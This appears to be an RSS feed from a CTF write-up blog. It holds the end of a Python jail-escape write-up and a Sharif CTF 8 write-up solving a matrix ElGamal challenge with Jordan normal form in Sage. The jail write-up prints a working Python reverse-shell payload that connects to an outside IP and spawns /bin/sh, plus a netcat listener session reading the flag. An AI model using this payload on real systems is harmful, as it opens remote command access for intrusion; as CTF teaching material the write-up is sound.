&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> subprocess
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cmd &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#34;python&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;-c&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#39;import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&amp;#34;41.102.162.29&amp;#34;,2130)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>subprocess&lt;span style="color:#f92672">.&lt;/span>Popen(cmd)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>I used &amp;ldquo;subprocess.Popen&amp;rdquo; and run the &amp;ldquo;python -c&amp;rdquo;, to spawn a new background process, in order to avoid killing the process after closing the connection.
we won&amp;rsquo;t see any output in this jail, but you will get a reverser shell.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ nc -vvntlp &lt;span style="color:#ae81ff">2130&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Listening on any address &lt;span style="color:#ae81ff">2130&lt;/span> &lt;span style="color:#f92672">(&lt;/span>xds&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection from 41.102.162.29:39190
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ id
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>uid&lt;span style="color:#f92672">=&lt;/span>999&lt;span style="color:#f92672">(&lt;/span>ctf&lt;span style="color:#f92672">)&lt;/span> gid&lt;span style="color:#f92672">=&lt;/span>999&lt;span style="color:#f92672">(&lt;/span>ctf&lt;span style="color:#f92672">)&lt;/span> groups&lt;span style="color:#f92672">=&lt;/span>999&lt;span style="color:#f92672">(&lt;/span>ctf&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ls -la
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>total &lt;span style="color:#ae81ff">12&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>drwxr-xr-x &lt;span style="color:#ae81ff">1&lt;/span> root ctf &lt;span style="color:#ae81ff">4096&lt;/span> Mar &lt;span style="color:#ae81ff">24&lt;/span> 02:10 .
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>drwxr-xr-x &lt;span style="color:#ae81ff">1&lt;/span> root ctf &lt;span style="color:#ae81ff">4096&lt;/span> Mar &lt;span style="color:#ae81ff">24&lt;/span> 02:10 ..
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-rwxr-x--- &lt;span style="color:#ae81ff">1&lt;/span> root ctf &lt;span style="color:#ae81ff">59&lt;/span> Mar &lt;span style="color:#ae81ff">23&lt;/span> 04:17 flag
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cat flag
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c2VjdXJpbmV0c3szODExMjc5Zjg4M2JkM2Q3ZWFkZjU3NmNlY2Y4ZDVjYn0$
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cat flag | base64 -d
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>securinets&lt;span style="color:#f92672">{&lt;/span>3811279f883bd3d7eadf576cecf8d5cb&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Jails could be escaped taking various ways.&lt;/p>
&lt;p>I&amp;rsquo;m not sure if the solution I come to is the intended one.&lt;/p>
&lt;p>FLAG: securinets{3811279f883bd3d7eadf576cecf8d5cb}&lt;/p></description></item><item><title>SharifCTF8_ElGamat</title><link>https://philomath213.github.io/post/sharifctf8_elgamat/</link><pubDate>Wed, 26 Sep 2018 22:19:28 +0100</pubDate><guid>https://philomath213.github.io/post/sharifctf8_elgamat/</guid><description>&lt;h1 id="sharif-ctf-8---elgamat-writeup">Sharif CTF 8 - ElGamat WriteUp&lt;/h1>
&lt;h2 id="challenge-details">Challenge details&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:left">Event&lt;/th>
&lt;th style="text-align:left">Challenge&lt;/th>
&lt;th style="text-align:left">Category&lt;/th>
&lt;th style="text-align:center">Points&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:left">Sharif CTF 8&lt;/td>
&lt;td style="text-align:left">ElGamat&lt;/td>
&lt;td style="text-align:left">Crypto&lt;/td>
&lt;td style="text-align:center">200&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="description">Description&lt;/h3>
&lt;blockquote>
&lt;p>ElGamal over Matrices: algebra-focused crypto challenge&lt;/p>
&lt;p>you can find full description in &lt;a href="https://philomath213.github.io/post/sharifctf8_elgamat/ElGamat.pdf">ElGamat.pdf&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;h3 id="attachments">Attachments&lt;/h3>
&lt;blockquote>
&lt;p>&lt;a href="https://philomath213.github.io/post/sharifctf8_elgamat/Matrices.txt">Matrices.txt&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;h2 id="solution">Solution&lt;/h2>
&lt;p>This problem appears to be similar to the discrete logarithm problem (see &lt;a href="https://en.wikipedia.org/wiki/Discrete_logarithm">Discrete logarithm&lt;/a>), but instead of the generator g we a have a matrix \(G\), So we need to find \(x\) such that \(G^x = H\) (both \(G\) and \(H\) are \(5\times5\) Matrices).&lt;/p>
&lt;p>Matrices =&amp;gt; Linear Algebra: this challenge requires some fundamentals in linear algebra.&lt;/p>
&lt;p>At the beginning I tried to diagonalize the matrix \(G\) and \(H\) in order to transform the problem to a discrete logarithm problem, but it will stay hard to solve since \(p-1\) is not a product of small primes which in this case Pohlig–Hellman algorithm is not an efficient method for computing the discrete logarithms.&lt;/p>
&lt;p>After doing some googling I figure out that in order to make this problem easy to solve we need to put both Matrices \(G\) and \(H\) in Jordan normal form (see &lt;a href="https://en.wikipedia.org/wiki/Jordan_normal_form">Jordan normal form&lt;/a>)&lt;/p>
&lt;p>A Jordan matrix has each non-zero off-diagonal entry equal to \(1\), immediately above the main diagonal.&lt;/p>
&lt;p>for A a Jordan block as \(2\times2\) matrix, if we have a repeated eigenvalues:&lt;/p>
&lt;p>$$
A = \begin{pmatrix} \lambda &amp;amp; 1 \\ 0 &amp;amp; \lambda \end{pmatrix}
$$
for \(B = A^x\):
$$
B = \begin{pmatrix} \lambda^x &amp;amp; x\lambda^{x-1} \\ 0 &amp;amp; \lambda^x \end{pmatrix}
$$&lt;/p>
&lt;p>$$x = {-b \pm \sqrt{b^2-4ac} \over 2a}.$$&lt;/p>
&lt;p>therefore in this case:
$$
B_{12} = xB_{11}A_{11}^{-1} \iff x = A_{11}B_{12}B_{11}^{-1}
$$&lt;/p>
&lt;p>Now we need to apply this solution to ElGamat problem&lt;/p>
&lt;p>In our case \(G[3][3]\) to \(G[4][4]\) is a Jordan block with repeated eigenvalues, and all arithmetic operations are in Quotient Ring \(Z/Z_p\)&lt;/p>
&lt;p>this is my code in sage (&lt;a href="ElGamat.sage">ElGamat.sage&lt;/a>):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> hashlib
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1461501637330902918203684832716283019655932542983&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>G &lt;span style="color:#f92672">=&lt;/span> [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">1287397632974625907369332145667695136576732725719&lt;/span>, &lt;span style="color:#ae81ff">999149001044306271168727399637009399486427921379&lt;/span>, &lt;span style="color:#ae81ff">1046504160269652701583906344218556291030141088947&lt;/span>, &lt;span style="color:#ae81ff">724446625683754938181565321149725788430461092168&lt;/span>, &lt;span style="color:#ae81ff">1071845980147173642753960259602135592110139561915&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">947603660931904341080240982051313712707367037453&lt;/span>, &lt;span style="color:#ae81ff">312289846563741934103580532543082761760226637905&lt;/span>, &lt;span style="color:#ae81ff">494739786803547247505263837170488583876166831850&lt;/span>, &lt;span style="color:#ae81ff">680540462980071181450018491798299105995449257198&lt;/span>, &lt;span style="color:#ae81ff">2602258415762368797405060707505977243346704576&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">996213673531855992829525358578006610606634622631&lt;/span>, &lt;span style="color:#ae81ff">1025711294257038288640877971869685565227647136954&lt;/span>, &lt;span style="color:#ae81ff">1432432135773706484846126533752827108541355741973&lt;/span>, &lt;span style="color:#ae81ff">1238541870126055576875033883691918425137600727481&lt;/span>, &lt;span style="color:#ae81ff">1130938956963588695293783764965618873887596017827&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">1320933266015680090206505704792362493057963931979&lt;/span>, &lt;span style="color:#ae81ff">1151746112645644166669332171392580649376526147475&lt;/span>, &lt;span style="color:#ae81ff">117512451110908867093773368598681106589771485221&lt;/span>, &lt;span style="color:#ae81ff">78071463743800894350883457304401524272336187149&lt;/span>, &lt;span style="color:#ae81ff">350437511649326676405126284689545814008237687775&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">438339253001275654203062260777687750937184662400&lt;/span>, &lt;span style="color:#ae81ff">372483950165136927369598298270629892810999203086&lt;/span>, &lt;span style="color:#ae81ff">859008773869616460027135965589262417694174453098&lt;/span>, &lt;span style="color:#ae81ff">1174526536643808668299968641952541506024584582818&lt;/span>, &lt;span style="color:#ae81ff">13201859260259503932772826643483081858286638179&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>H &lt;span style="color:#f92672">=&lt;/span> [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">903022231855038558383593109888227525558007552960&lt;/span>, &lt;span style="color:#ae81ff">565977275270298825053282757799743346899236483368&lt;/span>, &lt;span style="color:#ae81ff">989303675765663596792169321947495382568831693037&lt;/span>, &lt;span style="color:#ae81ff">601579288654704389384765634776493921679315260303&lt;/span>, &lt;span style="color:#ae81ff">913791750749394879333717884106841876340654737006&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">1159121456278955861257379214176694847802842944213&lt;/span>, &lt;span style="color:#ae81ff">55304385436577133507085707981392660143782780650&lt;/span>, &lt;span style="color:#ae81ff">559867756424853909301288957105188829240808301823&lt;/span>, &lt;span style="color:#ae81ff">1230859641388132364539374469026906952870988170695&lt;/span>, &lt;span style="color:#ae81ff">1423995124592695628047882256427827379994877406997&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">1125565199147204322161069021173152827232960621114&lt;/span>, &lt;span style="color:#ae81ff">1373772036013472137002755957284397215018630262515&lt;/span>, &lt;span style="color:#ae81ff">640623873603434273377865546046279663852895430999&lt;/span>, &lt;span style="color:#ae81ff">1056809237992218798189986002766547616222871640976&lt;/span>, &lt;span style="color:#ae81ff">1426649441470162608512662468308504390861950649943&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">303729376872199895471546635639837180361513146712&lt;/span>, &lt;span style="color:#ae81ff">1163767872227950278851006729914569662442255257700&lt;/span>, &lt;span style="color:#ae81ff">1320342731346163804219021270875175061467772367004&lt;/span>, &lt;span style="color:#ae81ff">433001013681018647747911760920686992297849343282&lt;/span>, &lt;span style="color:#ae81ff">1149024280460224794070159244078925721991430685838&lt;/span>],
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#ae81ff">23661702916810298505759145354543089608241235601&lt;/span>, &lt;span style="color:#ae81ff">1048655828654821525617176122368805879408325508567&lt;/span>, &lt;span style="color:#ae81ff">587846047820504813842423941849757078103027466928&lt;/span>, &lt;span style="color:#ae81ff">1338365929525105225695097114139069216753339875455&lt;/span>, &lt;span style="color:#ae81ff">1425543850003062038868121400064269552725872690214&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>R &lt;span style="color:#f92672">=&lt;/span> IntegerModRing(p)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>M &lt;span style="color:#f92672">=&lt;/span> MatrixSpace(R, &lt;span style="color:#ae81ff">5&lt;/span>, &lt;span style="color:#ae81ff">5&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>g &lt;span style="color:#f92672">=&lt;/span> M(G)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>h &lt;span style="color:#f92672">=&lt;/span> M(H)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>g, p_mat &lt;span style="color:#f92672">=&lt;/span> g&lt;span style="color:#f92672">.&lt;/span>jordan_form(transformation&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">True&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print &lt;span style="color:#e6db74">&amp;#39;[+] jordan normal for G:&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> g:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print i
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>h &lt;span style="color:#f92672">=&lt;/span> p_mat&lt;span style="color:#f92672">.&lt;/span>inverse()&lt;span style="color:#f92672">*&lt;/span>h&lt;span style="color:#f92672">*&lt;/span>p_mat
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print &lt;span style="color:#e6db74">&amp;#39;[+] jordan normal for H:&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> h:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print i
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>a11 &lt;span style="color:#f92672">=&lt;/span> g[&lt;span style="color:#ae81ff">3&lt;/span>][&lt;span style="color:#ae81ff">3&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>b11 &lt;span style="color:#f92672">=&lt;/span> h[&lt;span style="color:#ae81ff">3&lt;/span>][&lt;span style="color:#ae81ff">3&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>b12 &lt;span style="color:#f92672">=&lt;/span> h[&lt;span style="color:#ae81ff">3&lt;/span>][&lt;span style="color:#ae81ff">4&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>x &lt;span style="color:#f92672">=&lt;/span> a11&lt;span style="color:#f92672">*&lt;/span>b12&lt;span style="color:#f92672">/&lt;/span>b11
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">assert&lt;/span> b12 &lt;span style="color:#f92672">==&lt;/span> x&lt;span style="color:#f92672">*&lt;/span>a11&lt;span style="color:#f92672">^&lt;/span>(x&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print &lt;span style="color:#e6db74">&amp;#39;[+] solution:&amp;#39;&lt;/span>, x
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">flag_gen&lt;/span>(alpha):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#e6db74">&amp;#39;SharifCTF{&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">}&amp;#39;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> hashlib&lt;span style="color:#f92672">.&lt;/span>md5(str(alpha)&lt;span style="color:#f92672">.&lt;/span>encode())&lt;span style="color:#f92672">.&lt;/span>hexdigest()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print &lt;span style="color:#e6db74">&amp;#39;[+] FLAG:&amp;#39;&lt;/span>, flag_gen(x)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item></channel></rss>